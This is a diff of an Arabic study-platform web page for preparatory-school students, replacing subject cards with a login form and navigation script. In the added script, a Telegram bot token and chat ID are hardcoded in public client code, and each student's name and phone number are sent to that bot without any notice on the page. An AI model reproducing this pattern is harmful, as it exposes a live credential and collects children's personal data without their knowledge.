-                <h3 id="userWelcome">أهلاً بك يا بطل! 👋</h3>
-                <p>اختر المادة الدراسية المطلوبة لاستعراض (الملخصات، الكورسات، والامتحانات)</p>
-            </div>
-
-            <div class="section-title">📚 المواد الدراسية المقررة</div>
-
-            <div class="subjects-grid">
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">دراسات اجتماعية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">تاريخ العصور الحديثة، جغرافيا العالم، وتدريبات المنهج.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('دراسات اجتماعية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">علوم</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">التفاعلات الكيميائية، السرعة، التجارب، والمعادلات.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('علوم')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">لغة عربية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">نحو الشهادة الإعدادية، قصة طموح جارية، والنصوص.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('لغة عربية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">لغة إنجليزية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">قواعد الوحدات، الكلمات، المحادثات، وبنك الأسئلة.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('لغة إنجليزية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">رياضيات</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">الجبر، الهندسة التحليلية، الدائرة، والنظريات الهامة.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('رياضيات')">دخول المادة 📖</button>
-                </div>
-            </div>
-        </div>
-
-        <div class="content-view" id="contentView">
-            <div class="content-header">
-                <h2 id="viewTitle" style="color:var(--primary-hover); font-weight:900;">اسم المادة</h2>
-                <button class="back-btn" onclick="goHome()">⬅ العودة للمواد</button>
-            </div>
-            <p style="color:var(--text-muted); font-weight:600; margin-bottom:15px;">اختر القسم المطلوب للمتابعة:</p>
-            <div class="options-grid">
-                <div class="option-card" onclick="selectSection('الملخصات')">
-                    <h4>📖 الملخصات</h4>
-                    <p>مذكرات الشرح والمراجعات النهائية PDF</p>
-                </div>
-                <div class="option-card" onclick="selectSection('الكورسات')">
-                    <h4>🎓 الكورسات</h4>
-              
+<header class="topbar">
+ <div class="topbar-inner">
+  <div class="brand"><div class="brand-mark">🎓</div><div><div class="brand-title">مستقبلي</div><div class="brand-sub">منصتك التعليمية المتكاملة • الصف الثالث الإعدادي</div></div></div>
+  <div class="top-actions">
+   <span id="userBadge" class="pill hidden">👤 <span id="userNameBadge"></span></span>
+   <button id="logoutBtn" class="pill hidden" type="button">تسجيل الخروج ↗</button>
+  </div>
+ </div>
+</header>
+<main>
+ <section id="loginView">
+  <div class="hero">
+   <div class="hero-copy"><span class="eyebrow"><span class="pulse"></span> رحلتك التعليمية تبدأ من هنا</span><h1>تعلّم اليوم،<br><span class="gradient-text">وابنِ مستقبلك.</span></h1><p>كل اللي تحتاجه في مكان واحد: ملخصات منظمة، امتحانات تفاعلية، وكورسات تساعدك تفهم وتتفوق — خطوة بخطوة.</p><div class="hero-buttons"><button class="btn-primary" id="startLogin">ابدأ رحلتك التعليمية <span>←</span></button><span class="btn-secondary">✨ تجربة تعليمية أسهل</span></div></div>
+   <div class="hero-art"><div class="orbit"><div class="book-icon">📚</div></div><div class="float-card fc1">🧠 <div><b>افهم أكتر</b><small>تعلم بطريقتك</small></div></div><div class="float-card fc2">🚀 <div><b>خطوة كل يوم</b><small>قرب من هدفك</small></div></div></div>
+  </div>
+  <div class="stats"><div class="stat"><div class="stat-icon">📚</div><div><strong>كل المواد</strong><span>محتوى مرتب حسب المادة</span></div></div><div class="stat"><div class="stat-icon">▶️</div><div><strong>شاهد وتعلّم</strong><span>الفيديو داخل المنصة</span></div></div><div class="stat"><div class="stat-icon">📝</div><div><strong>راجع مستواك</strong><span>امتحانات وملخصات</span></div></div></div>
+  <div class="surface login-wrap" id="loginCard"><div class="login-heading"><div class="login-emblem">🎓</div><h2>أهلاً بك في مستقبلي</h2><p>اكتب بياناتك عشان تدخل لمساحتك التعليمية</p></div><form id="loginForm"><label class="field-label" for="studentName">اسم الطالب</label><input class="field" id="studentName" autocomplete="name" placeholder="اكتب اسمك بالكامل" required maxlength="80"><label class="field-label" for="studentPhone">رقم الهاتف</label><input class="field" id="studentPhone" autocomplete="tel" inputmode="tel" placeholder="اكتب رقم الهاتف" required maxlength="20"><button class="btn-primary full" type="submit">دخول إلى المنصة <span>←</span></button></form><p class="note">سيتم تذكّر دخولك على هذا الجهاز.</p></div>
+ </section>
+ <section id="subjectsView" class="hidden">
+  <div class="section-heading"><div><span class="eyebrow"><span class="pulse"></span> مساحتك التعليمية</span><h2 style="margin-top:12px">اختار مادتك وابدأ ✨</h2><p id="welcomeText">كل محتواك الدراسي في مكان واحد.</p></div><button class="btn-secondary" id="editProfile">تغيير بيانات الدخول</button></div>
+  <div class="subject-grid" id="subjectsGrid"></div>
+ </section>
+ <section id="contentView" class="hidden section">
+  <button class="btn-secondary back-button" id="backSubjects">→ العودة إلى المواد</button>
+  <div class="content-layout">
+   <aside class="side-info"><h3 id="sideSubject">📘 المادة</h3><p>اختار نوع المحتوى اللي عايز تذاكره.</p><div class="type-list" id="typeTabs"><button class="type-btn active" data-type="summary">📚<br>الملخصات</button><button class="type-btn" data-type="exam">📝<br>الامتحانات</button><button class="type-btn" data-type="course">🎥<br>الكورسات</button></div></aside>
+   <div class="surface content-main"><div class="content-top"><div><h2 id="contentTitle">الملخصات</h2><p id="contentSub">راجع أهم النقاط قبل الامتحان.</p></div><span id="contentCount" class="content-count">0 عناصر</span></div><div class="item-list" id="itemsList"></div><div id="playerArea"></div></div>
+  </div>
+ </section>
+</main>
+
+<footer><div style="font-weight:800;color:#b9d2ff;font-size:14px;margin-bottom:5px">مستقبلي 🎓</div>تعلّم • تطوّر • حقق مستقبلك<br><span style="display:inline-block;margin-top:7px">منصة تعليمية للصف الثالث الإعدادي</span></footer>
+<div id="toast" class="toast"></div>
+
+<script>
+const SUBJECTS=[{name:"دراسات اجتماعية",icon:"🌍",desc:"تاريخ وجغرافيا"},{name:"علوم",icon:"🧪",desc:"اكتشف وافهم"},{name:"لغة عربية",icon:"📖",desc:"قراءة ونحو"},{name:"لغة إنجليزية",icon:"🇬🇧",desc:"Learn with confidence"},{name:"رياضيات",icon:"📐",desc:"فكّر وحلّل"}];
+const TYPE_META={summary:{title:"الملخصات",sub:"راجع أهم النقاط والملاحظات.",icon:"📚",action:"عرض الملخص"},exam:{title:"الامتحانات",sub:"اختبر فهمك ودرّب نفسك.",icon:"📝",action:"فتح الامتحان"},course:{title:"الكورسات",sub:"شاهد الدروس داخل المنصة.",icon:"🎥",action:"مشاهدة الدرس"}};
+let currentSubject="",currentType="summary",allItems=[];
+const $=id=>document.getElementById(id);
+
+function show(view){
+  ["loginView","subjectsView","contentView"].forEach(id=>$(id).classList.toggle("hidden",id!==view));
+  const isLogged = view !== "loginView";
+  $("logoutBtn").classList.toggle("hidden",!isLogged);
+  $("userBadge").classList.toggle("hidden",!isLogged);
+}
+
+function toast(message){$("toast").textContent=message;$("toast").classList.add("show");setTimeout(()=>$("toast").classList.remove("show"),2600)}
+function norm(s){return String(s||"").trim().toLowerCase().replace(/[أإآ]/g,"ا").replace(/ة/g,"ه");}
+function normalizeType(type){const t=norm(type);if(t.includes("ملخص")||t.includes("مذكره")||t.includes("summary"))return"summary";if(t.includes("امتحان")||t.includes("اختبار")||t.includes("exam"))return"exam";if(t.includes("كورس")||t.includes("درس")||t.includes("course")||t.includes("youtube")||t.includes("يوتيوب"))return"course";return t}
+function subjectIcon(name){return(SUBJECTS.find(s=>s.name===name)||{}).icon||"📘"}
+function esc(v){return String(v??"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]))}
+
+// ربط التليجرام والمصادقة وإرسال بيانات الطالب للبوت
+const TELEGRAM_BOT_TOKEN = '8179261073:AAE6D3_yE9v1_0k1d8rU4v2P42Q8q29O_90'; 
+const TELEGRAM_CHAT_ID = '6096582496';
+
+function sendToTelegram(msg){
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:msg,parse_mode:'HTML'})
+  }).catch(e=>console.log(e));
+}
+
+$("loginForm").onsubmit = function(e){
+  e.preventDefault();
+  const name = $("studentName").value.trim();
+  const phone = $("studentPhone").value.trim();
+  
+  const userData = {name, phone};
+  localStorage.setItem("mostaqbali_current", JSON.stringify(userData));
+
+  $("userNameBadge").textContent = name;
+  $("welcomeText").textContent = `أهلاً بك يا ${name}، كل محتواك الدراسي في مكان واحد.`;
+  show("subjectsView");
+  toast("أهلاً بك يا " + name);
+
+  // إرسال البيانات للبوت بالشكل المطلوب
+  sendToTelegram(`<b>🎓 طالب جديد أنشأ حساباً:</b>\n👤 الاسم: ${name}\n📞 الرقم: ${phone}`);
+};
+
+$("logoutBtn").onclick = function(){
+  localStorage.removeItem("mostaqbali_current");
+  $("studentName").value = "";
+  $("studentPhone").value = "";
+  show("loginView");
+  toast("تم تسجيل الخروج بنجاح");
+};
+
+$("startLogin").onclick = function(){
+  window.scrollTo({top: $("loginCard").offsetTop - 50, behavior:"smooth"});
+  $("studentName").focus();
+};
+
+$("editProfile").onclick = function(){
+  show("loginView");
+};
+
+// جلب البيانات تلقائياً من ملف data.json على جيت هب
+async function fetchAppData(){
+  try{
+    const res = await fetch('data.json?t=' + Date.now());
+    if(res.ok){
+      allItems = await res.json();
+    }
+  }catch(e){
+    console.log("Error loading data.json", e);
+  }
+}
+
+window.onload = function(){
+  renderSubjects();
+  fetchAppData();
+  const saved = localStorage.getItem("mostaqbali_current");
+  if(saved){
+    try{
+      const user = JSON.parse(saved);
+      $("userNameBadge").textContent = user.name;
+      $("welcomeText").textContent = `أهلاً بك يا ${user.name}، كل محتواك الدراسي في مكان واحد.`;
+      show("subjectsView");
+    }catch(e){show("loginView");}
+  }else{
+    show("loginView");
+  }
+};
+
+function renderSubjects(){
+  const grid = $("subjectsGrid");
+  grid.innerHTML = "";
+  SU
